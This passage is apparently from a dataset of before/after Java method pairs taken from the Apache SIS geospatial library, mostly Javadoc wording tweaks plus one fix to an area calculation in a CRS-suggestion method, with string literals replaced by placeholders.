  for (int i=0; i < characterizedBy.length; i++) {
    final AttributeType<?> attribute=characterizedBy[i];
    ensureNonNullElement(""String_Node_Str"",i,attribute);
    GenericName name=attribute.getName();
    String key=AbstractIdentifiedType.toString(name,source,""String_Node_Str"",i);
    final Integer value=index++;
    if (indices.put(key,value) != null) {
      throw new IllegalArgumentException(Errors.format(Errors.Keys.DuplicatedIdentifier_1,key));
    }
    while (name instanceof ScopedName) {
      if (name == (name=((ScopedName)name).tail()))       break;
      key=name.toString();
      if (key == null || (key=key.trim()).isEmpty())       break;
      if (aliases.put(key,value) != null) {
        aliases.put(key,-1);
      }
    }
  }
  for (  final Map.Entry<String,Integer> entry : aliases.entrySet()) {
    final Integer value=entry.getValue();
    if (value >= 0) {
      JDK8.putIfAbsent(indices,entry.getKey(),value);
    }
  }
  this.indices=CollectionsExt.compact(indices);
}","/** 
 * Creates a new map for the given attribute characteristics. <p>This constructor does not clone the   {@code characterizedBy} array. If that arrayis a user-provided argument, then cloning that array is caller responsibility.</p>
 * @param source           the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  characteristics of {@code source}. Should not be empty.
 * @throws IllegalArgumentException if two characteristics have the same name.
 */
private CharacteristicTypeMap(final AttributeType<?> source,final AttributeType<?>[] characterizedBy){
  this.characterizedBy=characterizedBy;
  int index=0;
  final Map<String,Integer> indices=new HashMap<>(Containers.hashMapCapacity(characterizedBy.length));
  final Map<String,Integer> aliases=new HashMap<>();
  for (int i=0; i < characterizedBy.length; i++) {
    final AttributeType<?> attribute=characterizedBy[i];
    ensureNonNullElement(""String_Node_Str"",i,attribute);
    GenericName name=attribute.getName();
    String key=AbstractIdentifiedType.toString(name,source,""String_Node_Str"",i);
    final Integer value=index++;
    if (indices.put(key,value) != null) {
      throw new IllegalArgumentException(Errors.format(Errors.Keys.DuplicatedIdentifier_1,key));
    }
    while (name instanceof ScopedName) {
      if (name == (name=((ScopedName)name).tail()))       break;
      key=name.toString();
      if (key == null || (key=key.trim()).isEmpty())       break;
      if (aliases.put(key,value) != null) {
        aliases.put(key,-1);
      }
    }
  }
  for (  final Map.Entry<String,Integer> entry : aliases.entrySet()) {
    final Integer value=entry.getValue();
    if (value >= 0) {
      JDK8.putIfAbsent(indices,entry.getKey(),value);
    }
  }
  this.indices=CollectionsExt.compact(indices);
}"
91765,"/** 
 * Invoked on serialization for saving the   {@link #characteristics} field.
 * @param out The output stream where to serialize this attribute type.
 * @throws IOException If an I/O error occurred while writing.
 */
private void writeObject(final ObjectOutputStream out) throws IOException {
  out.defaultWriteObject();
  out.writeObject(characteristics != null ? characteristics.characterizedBy : null);
}","/** 
 * Invoked on serialization for saving the   {@link #characteristics} field.
 * @param out The output stream where to serialize this attribute type.
 * @throws IOException if an I/O error occurred while writing.
 */
private void writeObject(final ObjectOutputStream out) throws IOException {
  out.defaultWriteObject();
  out.writeObject(characteristics != null ? characteristics.characterizedBy : null);
}"
91766,"/** 
 * Returns any feature operation, any feature attribute type and any feature association role that carries characteristics of a feature type. The returned collection will include the properties inherited from the   {@linkplain #getSuperTypes() super-types} only if {@code includeSuperTypes}is   {@code true}.
 * @param includeSuperTypes {@code true} for including the properties inherited from the super-types,or  {@code false} for returning only the properties defined explicitely in this type.
 * @return feature operation, attribute type and association role that carries characteristics of thisfeature type (not including parent types).
 */
@Override public Collection<PropertyType> getProperties(final boolean includeSuperTypes){
  return includeSuperTypes ? allProperties : properties;
}","/** 
 * Returns any feature operation, any feature attribute type and any feature association role that carries characteristics of a feature type. The returned collection will include the properties inherited from the   {@linkplain #getSuperTypes() super-types} only if {@code includeSuperTypes}is   {@code true}.
 * @param includeSuperTypes  {@code true} for including the properties inherited from the super-types,or  {@code false} for returning only the properties defined explicitely in this type.
 * @return feature operation, attribute type and association role that carries characteristics of thisfeature type (not including parent types).
 */
@Override public Collection<PropertyType> getProperties(final boolean includeSuperTypes){
  return includeSuperTypes ? allProperties : properties;
}"
91767,"/** 
 * Not yet supported.
 * @return Currently never return.
 * @throws ParseException currently always thrown.
 */
@Override public Object parse(final CharSequence text,final ParsePosition pos) throws ParseException {
  throw new ParseException(Errors.getResources(displayLocale).getString(Errors.Keys.UnsupportedOperation_1,""String_Node_Str""),0);
}","/** 
 * Not yet supported.
 * @return currently never return.
 * @throws ParseException currently always thrown.
 */
@Override public Object parse(final CharSequence text,final ParsePosition pos) throws ParseException {
  throw new ParseException(Errors.getResources(displayLocale).getString(Errors.Keys.UnsupportedOperation_1,""String_Node_Str""),0);
}"
91768,"/** 
 * Creates an operation computing the envelope that encompass all geometries found in the given attributes. Geometries can be in different coordinate reference systems; they will be transformed to the first non-null CRS in the following choices: <ol> <li>the CRS specified to this method,</li> <li>the CRS of the default geometry, or</li> <li>the CRS of the first non-empty geometry.</li> </ol> The   {@linkplain AbstractOperation#getResult() result} of this operation is an {@code Attribute}with values of type   {@link org.opengis.geometry.Envelope}. If the   {@code crs} argument given tothis method is non-null, then the {@linkplain org.apache.sis.geometry.GeneralEnvelope#getCoordinateReferenceSystem() envelope CRS}will be that CRS. <div class=""section"">Limitations</div> If a geometry contains other geometries, this operation queries only the envelope of the root geometry. It is the root geometry responsibility to take in account the envelope of all its children. <div class=""section"">Read/write behavior</div> This operation is read-only. Calls to   {@code Attribute.setValue(Envelope)} will result in an{@link IllegalStateException} to be thrown.
 * @param identification     the name and other information to be given to the operation.
 * @param crs                the Coordinate Reference System in which to express the envelope, or {@code null}.
 * @param geometryAttributes the operation or attribute type from which to get geometry values.Any element which is  {@code null} or has a non-geometric value class will be ignored.
 * @return an operation which will compute the envelope encompassing all geometries in the given attributes.
 * @throws FactoryException if a coordinate operation to the target CRS can not be created.
 */
public static Operation envelope(final Map<String,?> identification,final CoordinateReferenceSystem crs,final PropertyType... geometryAttributes) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",geometryAttributes);
  return POOL.unique(new EnvelopeOperation(identification,crs,geometryAttributes));
}","/** 
 * Creates an operation computing the envelope that encompass all geometries found in the given attributes. Geometries can be in different coordinate reference systems; they will be transformed to the first non-null CRS in the following choices: <ol> <li>the CRS specified to this method,</li> <li>the CRS of the default geometry, or</li> <li>the CRS of the first non-empty geometry.</li> </ol> The   {@linkplain AbstractOperation#getResult() result} of this operation is an {@code Attribute}with values of type   {@link org.opengis.geometry.Envelope}. If the   {@code crs} argument given tothis method is non-null, then the {@linkplain org.apache.sis.geometry.GeneralEnvelope#getCoordinateReferenceSystem() envelope CRS}will be that CRS. <div class=""section"">Limitations</div> If a geometry contains other geometries, this operation queries only the envelope of the root geometry. It is the root geometry responsibility to take in account the envelope of all its children. <div class=""section"">Read/write behavior</div> This operation is read-only. Calls to   {@code Attribute.setValue(Envelope)} will result in an{@link IllegalStateException} to be thrown.
 * @param identification      the name and other information to be given to the operation.
 * @param crs                 the Coordinate Reference System in which to express the envelope, or {@code null}.
 * @param geometryAttributes  the operation or attribute type from which to get geometry values.Any element which is  {@code null} or has a non-geometric value class will be ignored.
 * @return an operation which will compute the envelope encompassing all geometries in the given attributes.
 * @throws FactoryException if a coordinate operation to the target CRS can not be created.
 */
public static Operation envelope(final Map<String,?> identification,final CoordinateReferenceSystem crs,final PropertyType... geometryAttributes) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",geometryAttributes);
  return POOL.unique(new EnvelopeOperation(identification,crs,geometryAttributes));
}"
91769,"/** 
 * Appends a string representation of the ""formula"" used for computing the result.
 * @param buffer where to format the ""formula"".
 */
@Override void formatResultFormula(final Appendable buffer) throws IOException {
  buffer.append(referentName);
}","/** 
 * Appends a string representation of the ""formula"" used for computing the result.
 * @param buffer  where to format the ""formula"".
 */
@Override void formatResultFormula(final Appendable buffer) throws IOException {
  buffer.append(referentName);
}"
91770,"/** 
 * Returns the feature, or   {@code null} if none.
 * @return The feature (may be {@code null}).
 * @throws MultiValuedPropertyException if this association contains more than one value.
 */
@Override public Feature getValue(){
switch (values.size()) {
case 0:
    return null;
case 1:
  return values.get(0);
default :
throw new MultiValuedPropertyException(Resources.format(Resources.Keys.NotASingleton_1,getName()));
}
}","/** 
 * Returns the feature, or   {@code null} if none.
 * @return the feature (may be {@code null}).
 * @throws MultiValuedPropertyException if this association contains more than one value.
 */
@Override public Feature getValue(){
switch (values.size()) {
case 0:
    return null;
case 1:
  return values.get(0);
default :
throw new MultiValuedPropertyException(Resources.format(Resources.Keys.NotASingleton_1,getName()));
}
}"
91771,"/** 
 * Returns all features, or an empty collection if none. The returned collection is <cite>live</cite>: changes in the returned collection will be reflected immediately in this   {@code Association} instance, and conversely.
 * @return The features in a <cite>live</cite> collection.
 */
@Override @SuppressWarnings(""String_Node_Str"") public Collection<Feature> getValues(){
  return values;
}","/** 
 * Returns all features, or an empty collection if none. The returned collection is <cite>live</cite>: changes in the returned collection will be reflected immediately in this   {@code Association} instance, and conversely.
 * @return the features in a <cite>live</cite> collection.
 */
@Override @SuppressWarnings(""String_Node_Str"") public Collection<Feature> getValues(){
  return values;
}"
91772,"/** 
 * Sets the feature values. All previous values are replaced by the given collection.
 * @param newValues The new values.
 */
@Override public void setValues(final Collection<? extends Feature> newValues){
  if (newValues != values) {
    ArgumentChecks.ensureNonNull(""String_Node_Str"",newValues);
    final FeatureType base=role.getValueType();
    values.clear();
    for (    final Feature value : newValues) {
      ensureValid(base,value.getType());
      values.add(value);
    }
  }
}","/** 
 * Sets the feature values. All previous values are replaced by the given collection.
 * @param newValues  the new values.
 */
@Override public void setValues(final Collection<? extends Feature> newValues){
  if (newValues != values) {
    ArgumentChecks.ensureNonNull(""String_Node_Str"",newValues);
    final FeatureType base=role.getValueType();
    values.clear();
    for (    final Feature value : newValues) {
      ensureValid(base,value.getType());
      values.add(value);
    }
  }
}"
91773,"/** 
 * Returns a hash code value for this association.
 * @return A hash code value.
 */
@Override public int hashCode(){
  return role.hashCode() + values.hashCode();
}","/** 
 * Returns a hash code value for this association.
 * @return a hash code value.
 */
@Override public int hashCode(){
  return role.hashCode() + values.hashCode();
}"
91774,"/** 
 * Sets the feature.
 * @param value The new value, or {@code null} for removing all values from this association.
 */
@Override public void setValue(final Feature value){
  values.clear();
  if (value != null) {
    ensureValid(role.getValueType(),value.getType());
    values.add(value);
  }
}","/** 
 * Sets the feature.
 * @param value  the new value, or {@code null} for removing all values from this association.
 */
@Override public void setValue(final Feature value){
  values.clear();
  if (value != null) {
    ensureValid(role.getValueType(),value.getType());
    values.add(value);
  }
}"
91775,"/** 
 * Returns a copy of this association. This implementation returns a <em>shallow</em> copy: the association   {@linkplain #getValues() values} are <strong>not</strong> cloned.
 * @return A clone of this association.
 * @throws CloneNotSupportedException if this association can not be cloned.
 */
@Override @SuppressWarnings(""String_Node_Str"") public MultiValuedAssociation clone() throws CloneNotSupportedException {
  final MultiValuedAssociation clone=(MultiValuedAssociation)super.clone();
  clone.values=(CheckedArrayList<Feature>)clone.values.clone();
  return clone;
}","/** 
 * Returns a copy of this association. This implementation returns a <em>shallow</em> copy: the association   {@linkplain #getValues() values} are <strong>not</strong> cloned.
 * @return a clone of this association.
 * @throws CloneNotSupportedException if this association can not be cloned.
 */
@Override @SuppressWarnings(""String_Node_Str"") public MultiValuedAssociation clone() throws CloneNotSupportedException {
  final MultiValuedAssociation clone=(MultiValuedAssociation)super.clone();
  clone.values=(CheckedArrayList<Feature>)clone.values.clone();
  return clone;
}"
91776,"/** 
 * Returns the associated feature.
 * @return The associated feature (may be {@code null}).
 */
@Override public Feature getValue(){
  return value;
}","/** 
 * Returns the associated feature.
 * @return the associated feature (may be {@code null}).
 */
@Override public Feature getValue(){
  return value;
}"
91777,"/** 
 * Creates a new association of the given role initialized to the given value.
 * @param role  Information about the association.
 * @param value The initial value (may be {@code null}).
 */
SingletonAssociation(final FeatureAssociationRole role,final Feature value){
}","/** 
 * Creates a new association of the given role initialized to the given value.
 * @param role   information about the association.
 * @param value  the initial value (may be {@code null}).
 */
SingletonAssociation(final FeatureAssociationRole role,final Feature value){
}"
91778,"/** 
 * Returns a hash code value for this association.
 * @return A hash code value.
 */
@Override public int hashCode(){
  return role.hashCode() + Objects.hashCode(value);
}","/** 
 * Returns a hash code value for this association.
 * @return a hash code value.
 */
@Override public int hashCode(){
  return role.hashCode() + Objects.hashCode(value);
}"
91779,"/** 
 * Sets the associated feature.
 * @param value The new value, or {@code null}.
 * @throws InvalidPropertyValueException If the given feature is not valid for this association.
 */
@Override public void setValue(final Feature value) throws InvalidPropertyValueException {
  if (value != null) {
    ensureValid(role.getValueType(),value.getType());
  }
  this.value=value;
}","/** 
 * Sets the associated feature.
 * @param value  the new value, or {@code null}.
 * @throws InvalidPropertyValueException if the given feature is not valid for this association.
 */
@Override public void setValue(final Feature value) throws InvalidPropertyValueException {
  if (value != null) {
    ensureValid(role.getValueType(),value.getType());
  }
  this.value=value;
}"
91780,"/** 
 * Appends a string representation of the ""formula"" used for computing the result.
 * @param buffer where to format the ""formula"".
 */
@Override void formatResultFormula(final Appendable buffer) throws IOException {
  if (prefix != null)   buffer.append(prefix);
  for (int i=0; i < attributeNames.length; i++) {
    if (i != 0)     buffer.append(delimiter);
    buffer.append(attributeNames[i]);
  }
  if (suffix != null)   buffer.append(suffix);
}","/** 
 * Appends a string representation of the ""formula"" used for computing the result.
 * @param buffer  where to format the ""formula"".
 */
@Override void formatResultFormula(final Appendable buffer) throws IOException {
  if (prefix != null)   buffer.append(prefix);
  for (int i=0; i < attributeNames.length; i++) {
    if (i != 0)     buffer.append(delimiter);
    buffer.append(attributeNames[i]);
  }
  if (suffix != null)   buffer.append(suffix);
}"
91781,"/** 
 * Provides temporal component of the extent of the referring object.
 * @return The temporal extent, or an empty set if none.
 */
@Override @XmlElement(name=""String_Node_Str"") public Collection<TemporalExtent> getTemporalElements(){
  return temporalElements=nonNullCollection(temporalElements,TemporalExtent.class);
}","/** 
 * Provides temporal component of the extent of the referring object.
 * @return the temporal extent, or an empty set if none.
 */
@Override @XmlElement(name=""String_Node_Str"") public Collection<TemporalExtent> getTemporalElements(){
  return temporalElements=nonNullCollection(temporalElements,TemporalExtent.class);
}"
91782,"/** 
 * Provides geographic component of the extent of the referring object
 * @return The geographic extent, or an empty set if none.
 */
@Override @XmlElement(name=""String_Node_Str"") public Collection<GeographicExtent> getGeographicElements(){
  return geographicElements=nonNullCollection(geographicElements,GeographicExtent.class);
}","/** 
 * Provides geographic component of the extent of the referring object
 * @return the geographic extent, or an empty set if none.
 */
@Override @XmlElement(name=""String_Node_Str"") public Collection<GeographicExtent> getGeographicElements(){
  return geographicElements=nonNullCollection(geographicElements,GeographicExtent.class);
}"
91783,"/** 
 * Sets geographic component of the extent of the referring object.
 * @param newValues The new geographic elements.
 */
public void setGeographicElements(final Collection<? extends GeographicExtent> newValues){
  geographicElements=writeCollection(newValues,geographicElements,GeographicExtent.class);
}","/** 
 * Sets geographic component of the extent of the referring object.
 * @param newValues  the new geographic elements.
 */
public void setGeographicElements(final Collection<? extends GeographicExtent> newValues){
  geographicElements=writeCollection(newValues,geographicElements,GeographicExtent.class);
}"
91784,"/** 
 * Returns a SIS metadata implementation with the values of the given arbitrary implementation. This method performs the first applicable action in the following choices: <ul> <li>If the given object is   {@code null}, then this method returns   {@code null}.</li> <li>Otherwise if the given object is already an instance of  {@code DefaultExtent}, then it is returned unchanged.</li> <li>Otherwise a new   {@code DefaultExtent} instance is created using the{@linkplain #DefaultExtent(Extent) copy constructor}and returned. Note that this is a <cite>shallow</cite> copy operation, since the other metadata contained in the given object are not recursively copied.</li> </ul>
 * @param object The object to get as a SIS implementation, or {@code null} if none.
 * @return A SIS implementation containing the values of the given object (may be thegiven object itself), or  {@code null} if the argument was null.
 */
public static DefaultExtent castOrCopy(final Extent object){
  if (object == null || object instanceof DefaultExtent) {
    return (DefaultExtent)object;
  }
  return new DefaultExtent(object);
}","/** 
 * Returns a SIS metadata implementation with the values of the given arbitrary implementation. This method performs the first applicable action in the following choices: <ul> <li>If the given object is   {@code null}, then this method returns   {@code null}.</li> <li>Otherwise if the given object is already an instance of  {@code DefaultExtent}, then it is returned unchanged.</li> <li>Otherwise a new   {@code DefaultExtent} instance is created using the{@linkplain #DefaultExtent(Extent) copy constructor}and returned. Note that this is a <cite>shallow</cite> copy operation, since the other metadata contained in the given object are not recursively copied.</li> </ul>
 * @param object  the object to get as a SIS implementation, or {@code null} if none.
 * @return a SIS implementation containing the values of the given object (may be thegiven object itself), or  {@code null} if the argument was null.
 */
public static DefaultExtent castOrCopy(final Extent object){
  if (object == null || object instanceof DefaultExtent) {
    return (DefaultExtent)object;
  }
  return new DefaultExtent(object);
}"
91785,"/** 
 * Constructs a new instance initialized with the values from the specified metadata object. This is a <cite>shallow</cite> copy constructor, since the other metadata contained in the given object are not recursively copied.
 * @param object The metadata to copy values from, or {@code null} if none.
 * @see #castOrCopy(Extent)
 */
public DefaultExtent(final Extent object){
  super(object);
  if (object != null) {
    description=object.getDescription();
    geographicElements=copyCollection(object.getGeographicElements(),GeographicExtent.class);
    temporalElements=copyCollection(object.getTemporalElements(),TemporalExtent.class);
    verticalElements=copyCollection(object.getVerticalElements(),VerticalExtent.class);
  }
}","/** 
 * Constructs a new instance initialized with the values from the specified metadata object. This is a <cite>shallow</cite> copy constructor, since the other metadata contained in the given object are not recursively copied.
 * @param object  the metadata to copy values from, or {@code null} if none.
 * @see #castOrCopy(Extent)
 */
public DefaultExtent(final Extent object){
  super(object);
  if (object != null) {
    description=object.getDescription();
    geographicElements=copyCollection(object.getGeographicElements(),GeographicExtent.class);
    temporalElements=copyCollection(object.getTemporalElements(),TemporalExtent.class);
    verticalElements=copyCollection(object.getVerticalElements(),VerticalExtent.class);
  }
}"
91786,"/** 
 * Adds geographic, vertical or temporal extents inferred from the given envelope. This method inspects the   {@linkplain Envelope#getCoordinateReferenceSystem() envelope CRS}and creates a   {@link GeographicBoundingBox},   {@link VerticalExtent} or {@link TemporalExtent}elements as needed. <p><b>Note:</b> this method is available only if the referencing module is on the classpath.</p>
 * @param envelope The envelope to use for inferring the additional extents.
 * @throws UnsupportedOperationException if the referencing module is not on the classpath.
 * @throws TransformException if a coordinate transformation was required and failed.
 * @see DefaultGeographicBoundingBox#setBounds(Envelope)
 * @see DefaultVerticalExtent#setBounds(Envelope)
 * @see DefaultTemporalExtent#setBounds(Envelope)
 */
public void addElements(final Envelope envelope) throws TransformException {
  checkWritePermission();
  ReferencingServices.getInstance().addElements(envelope,this);
}","/** 
 * Adds geographic, vertical or temporal extents inferred from the given envelope. This method inspects the   {@linkplain Envelope#getCoordinateReferenceSystem() envelope CRS}and creates a   {@link GeographicBoundingBox},   {@link VerticalExtent} or {@link TemporalExtent}elements as needed. <p><b>Note:</b> this method is available only if the referencing module is on the classpath.</p>
 * @param envelope  the envelope to use for inferring the additional extents.
 * @throws UnsupportedOperationException if the referencing module is not on the classpath.
 * @throws TransformException if a coordinate transformation was required and failed.
 * @see DefaultGeographicBoundingBox#setBounds(Envelope)
 * @see DefaultVerticalExtent#setBounds(Envelope)
 * @see DefaultTemporalExtent#setBounds(Envelope)
 */
public void addElements(final Envelope envelope) throws TransformException {
  checkWritePermission();
  ReferencingServices.getInstance().addElements(envelope,this);
}"
91787,"/** 
 * Provides vertical component of the extent of the referring object.
 * @return The vertical extent, or an empty set if none.
 */
@Override @XmlElement(name=""String_Node_Str"") public Collection<VerticalExtent> getVerticalElements(){
  return verticalElements=nonNullCollection(verticalElements,VerticalExtent.class);
}","/** 
 * Provides vertical component of the extent of the referring object.
 * @return the vertical extent, or an empty set if none.
 */
@Override @XmlElement(name=""String_Node_Str"") public Collection<VerticalExtent> getVerticalElements(){
  return verticalElements=nonNullCollection(verticalElements,VerticalExtent.class);
}"
91788,"/** 
 * Sets temporal component of the extent of the referring object.
 * @param newValues The new temporal elements.
 */
public void setTemporalElements(final Collection<? extends TemporalExtent> newValues){
  temporalElements=writeCollection(newValues,temporalElements,TemporalExtent.class);
}","/** 
 * Sets temporal component of the extent of the referring object.
 * @param newValues  the new temporal elements.
 */
public void setTemporalElements(final Collection<? extends TemporalExtent> newValues){
  temporalElements=writeCollection(newValues,temporalElements,TemporalExtent.class);
}"
91789,"/** 
 * Sets the spatial and temporal extent for the referring object.
 * @param newValue The new description.
 */
public void setDescription(final InternationalString newValue){
  checkWritePermission();
  description=newValue;
}","/** 
 * Sets the spatial and temporal extent for the referring object.
 * @param newValue  the new description.
 */
public void setDescription(final InternationalString newValue){
  checkWritePermission();
  description=newValue;
}"
91790,"/** 
 * Returns the spatial and temporal extent for the referring object.
 * @return The spatial and temporal extent, or {@code null} in none.
 */
@Override @XmlElement(name=""String_Node_Str"") public InternationalString getDescription(){
  return description;
}","/** 
 * Returns the spatial and temporal extent for the referring object.
 * @return the spatial and temporal extent, or {@code null} in none.
 */
@Override @XmlElement(name=""String_Node_Str"") public InternationalString getDescription(){
  return description;
}"
91791,"/** 
 * Sets vertical component of the extent of the referring object.
 * @param newValues The new vertical elements.
 */
public void setVerticalElements(final Collection<? extends VerticalExtent> newValues){
  verticalElements=writeCollection(newValues,verticalElements,VerticalExtent.class);
}","/** 
 * Sets vertical component of the extent of the referring object.
 * @param newValues  the new vertical elements.
 */
public void setVerticalElements(final Collection<? extends VerticalExtent> newValues){
  verticalElements=writeCollection(newValues,verticalElements,VerticalExtent.class);
}"
91792,"/** 
 * Suggests a coordinate reference system which could be a common target for coordinate operations having the given sources. This method compares the   {@linkplain #getGeographicBoundingBox(CoordinateReferenceSystem) domain of validity} of all given CRSs. If a CRS has a domain of validity that contains the domain of all otherCRS, than that CRS is returned. Otherwise this method verifies if a  {@linkplain GeneralDerivedCRS#getBaseCRS() base CRS} (usually a {@linkplain org.apache.sis.referencing.crs.DefaultGeographicCRS geographic CRS} instance)would be suitable. If no suitable CRS is found, then this method returns  {@code null}. <div class=""note""><b>Use case:</b> before to test if two arbitrary envelopes   {@linkplain GeneralEnvelope#intersects(Envelope) intersect} each other,they need to be  {@linkplain Envelopes#transform(Envelope,CoordinateReferenceSystem) transformed} in the same CRS.However if one CRS is a Transverse Mercator projection while the other CRS is a world-wide geographic CRS, then attempts to use the Transverse Mercator projection as the common CRS is likely to fail since the geographic envelope may span an area far outside the projection domain of validity. This  {@code suggestTargetCRS()} method can usedfor choosing a common CRS which is less likely to fail.</div>
 * @param regionOfInterest  the geographic area for which the coordinate operations will be applied,or  {@code null} if unknown.
 * @param sourceCRS         the coordinate reference systems for which a common target CRS is desired.
 * @return a CRS that may be used as a common target for all the given source CRS in the given region of interest,or  {@code null} if this method did not find a common target CRS. The returned CRS may be different thanall given CRS.
 * @since 0.8
 */
public static CoordinateReferenceSystem suggestTargetCRS(GeographicBoundingBox regionOfInterest,CoordinateReferenceSystem... sourceCRS){
  boolean worldwide=false;
  DefaultGeographicBoundingBox domain=null;
  final GeographicBoundingBox[] domains=new GeographicBoundingBox[sourceCRS.length];
  for (int i=0; i < sourceCRS.length; i++) {
    final CoordinateReferenceSystem crs=sourceCRS[i];
    GeographicBoundingBox bbox=getGeographicBoundingBox(crs);
    if (bbox == null) {
      if (!(crs instanceof GeodeticCRS)) {
        return null;
      }
      if (regionOfInterest == null) {
        return crs;
      }
      bbox=regionOfInterest;
      worldwide=true;
    }
 else     if (!worldwide) {
      if (domain == null) {
        domain=new DefaultGeographicBoundingBox(bbox);
      }
 else {
        domain.add(bbox);
      }
    }
    domains[i]=bbox;
  }
  if (domain != null && !worldwide) {
    if (regionOfInterest != null) {
      domain.intersect(regionOfInterest);
    }
    regionOfInterest=domain;
    domain=null;
  }
  CoordinateReferenceSystem bestCRS=null;
  final double roiArea=Extents.area(regionOfInterest);
  double maxInsideArea=0;
  double minOutsideArea=Double.POSITIVE_INFINITY;
  boolean tryDerivedCRS=false;
  do {
    for (int i=0; i < domains.length; i++) {
      final GeographicBoundingBox bbox=domains[i];
      double insideArea=Extents.area(bbox);
      double outsideArea=0;
      if (regionOfInterest != null) {
        if (domain == null) {
          domain=new DefaultGeographicBoundingBox(bbox);
        }
 else {
          domain.setBounds(bbox);
        }
        domain.intersect(regionOfInterest);
        final double area=insideArea;
        insideArea=Extents.area(bbox);
        outsideArea=area - insideArea;
      }
      if (insideArea > maxInsideArea || (insideArea == maxInsideArea && outsideArea < minOutsideArea)) {
        maxInsideArea=insideArea;
        minOutsideArea=outsideArea;
        bestCRS=sourceCRS[i];
      }
    }
    if (maxInsideArea < roiArea) {
      if (tryDerivedCRS)       break;
      final SingleCRS[] derivedCRS=new SingleCRS[sourceCRS.length];
      for (int i=0; i < derivedCRS.length; i++) {
        GeographicBoundingBox bbox=null;
        final CoordinateReferenceSystem crs=sourceCRS[i];
        if (crs instanceof GeneralDerivedCRS) {
          final SingleCRS baseCRS=((GeneralDerivedCRS)crs).getBaseCRS();
          bbox=getGeographicBoundingBox(baseCRS);
          if (bbox == null) {
            bbox=regionOfInterest;
          }
          tryDerivedCRS=true;
          derivedCRS[i]=baseCRS;
        }
        domains[i]=bbox;
      }
      sourceCRS=derivedCRS;
    }
 else {
      break;
    }
  }
 while (tryDerivedCRS);
  return bestCRS;
}","/** 
 * Suggests a coordinate reference system which could be a common target for coordinate operations having the given sources. This method compares the   {@linkplain #getGeographicBoundingBox(CoordinateReferenceSystem) domain of validity} of all given CRSs. If a CRS has a domain of validity that contains the domain of all otherCRS, than that CRS is returned. Otherwise this method verifies if a  {@linkplain GeneralDerivedCRS#getBaseCRS() base CRS} (usually a {@linkplain org.apache.sis.referencing.crs.DefaultGeographicCRS geographic CRS} instance)would be suitable. If no suitable CRS is found, then this method returns  {@code null}. <div class=""note""><b>Use case:</b> before to test if two arbitrary envelopes   {@linkplain GeneralEnvelope#intersects(Envelope) intersect} each other,they need to be  {@linkplain Envelopes#transform(Envelope,CoordinateReferenceSystem) transformed} in the same CRS.However if one CRS is a Transverse Mercator projection while the other CRS is a world-wide geographic CRS, then attempts to use the Transverse Mercator projection as the common CRS is likely to fail since the geographic envelope may span an area far outside the projection domain of validity. This  {@code suggestTargetCRS()} method can usedfor choosing a common CRS which is less likely to fail.</div>
 * @param regionOfInterest  the geographic area for which the coordinate operations will be applied,or  {@code null} if unknown.
 * @param sourceCRS         the coordinate reference systems for which a common target CRS is desired.
 * @return a CRS that may be used as a common target for all the given source CRS in the given region of interest,or  {@code null} if this method did not find a common target CRS. The returned CRS may be different thanall given CRS.
 * @since 0.8
 */
public static CoordinateReferenceSystem suggestTargetCRS(GeographicBoundingBox regionOfInterest,CoordinateReferenceSystem... sourceCRS){
  boolean worldwide=false;
  DefaultGeographicBoundingBox domain=null;
  final GeographicBoundingBox[] domains=new GeographicBoundingBox[sourceCRS.length];
  for (int i=0; i < sourceCRS.length; i++) {
    final CoordinateReferenceSystem crs=sourceCRS[i];
    GeographicBoundingBox bbox=getGeographicBoundingBox(crs);
    if (bbox == null) {
      if (!(crs instanceof GeodeticCRS)) {
        return null;
      }
      if (regionOfInterest == null) {
        return crs;
      }
      bbox=regionOfInterest;
      worldwide=true;
    }
 else     if (!worldwide) {
      if (domain == null) {
        domain=new DefaultGeographicBoundingBox(bbox);
      }
 else {
        domain.add(bbox);
      }
    }
    domains[i]=bbox;
  }
  if (domain != null && !worldwide) {
    if (regionOfInterest != null) {
      domain.intersect(regionOfInterest);
    }
    regionOfInterest=domain;
    domain=null;
  }
  CoordinateReferenceSystem bestCRS=null;
  final double roiArea=Extents.area(regionOfInterest);
  double maxInsideArea=0;
  double minOutsideArea=Double.POSITIVE_INFINITY;
  boolean tryDerivedCRS=false;
  do {
    for (int i=0; i < domains.length; i++) {
      final GeographicBoundingBox bbox=domains[i];
      double insideArea=Extents.area(bbox);
      double outsideArea=0;
      if (regionOfInterest != null) {
        if (domain == null) {
          domain=new DefaultGeographicBoundingBox(bbox);
        }
 else {
          domain.setBounds(bbox);
        }
        domain.intersect(regionOfInterest);
        final double area=insideArea;
        insideArea=Extents.area(domain);
        outsideArea=area - insideArea;
      }
      if (insideArea > maxInsideArea || (insideArea == maxInsideArea && outsideArea < minOutsideArea)) {
        maxInsideArea=insideArea;
        minOutsideArea=outsideArea;
        bestCRS=sourceCRS[i];
      }
    }
    if (maxInsideArea < roiArea) {
      if (tryDerivedCRS)       break;
      final SingleCRS[] derivedCRS=new SingleCRS[sourceCRS.length];
      for (int i=0; i < derivedCRS.length; i++) {
        GeographicBoundingBox bbox=null;
        final CoordinateReferenceSystem crs=sourceCRS[i];
        if (crs instanceof GeneralDerivedCRS) {
          final SingleCRS baseCRS=((GeneralDerivedCRS)crs).getBaseCRS();
          bbox=getGeographicBoundingBox(baseCRS);
          if (bbox == null) {
            bbox=regionOfInterest;
          }
          tryDerivedCRS=true;
          derivedCRS[i]=baseCRS;
        }
        domains[i]=bbox;
      }
      sourceCRS=derivedCRS;
    }
 else {
      break;
    }
  }
 while (tryDerivedCRS);
  return bestCRS;
}"
91793,"/** 
 * Returns the geographic CRS on which the map projection is applied. This CRS defines the   {@linkplain #getDatum() datum} of this CRS and (at least implicitly)the  {@linkplain org.apache.sis.referencing.operation.DefaultConversion#getSourceCRS() source}of the   {@linkplain #getConversionFromBase() conversion from base}.
 * @return The base coordinate reference system, which must be geographic.
 */
@Override @XmlElement(name=""String_Node_Str"",required=true) public GeographicCRS getBaseCRS(){
  final Projection projection=super.getConversionFromBase();
  return (projection != null) ? projection.getSourceCRS() : null;
}","/** 
 * Returns the geographic CRS on which the map projection is applied. This CRS defines the   {@linkplain #getDatum() datum} of this CRS and (at least implicitly)the  {@linkplain org.apache.sis.referencing.operation.DefaultConversion#getSourceCRS() source}of the   {@linkplain #getConversionFromBase() conversion from base}.
 * @return the base coordinate reference system, which must be geographic.
 */
@Override @XmlElement(name=""String_Node_Str"",required=true) public GeographicCRS getBaseCRS(){
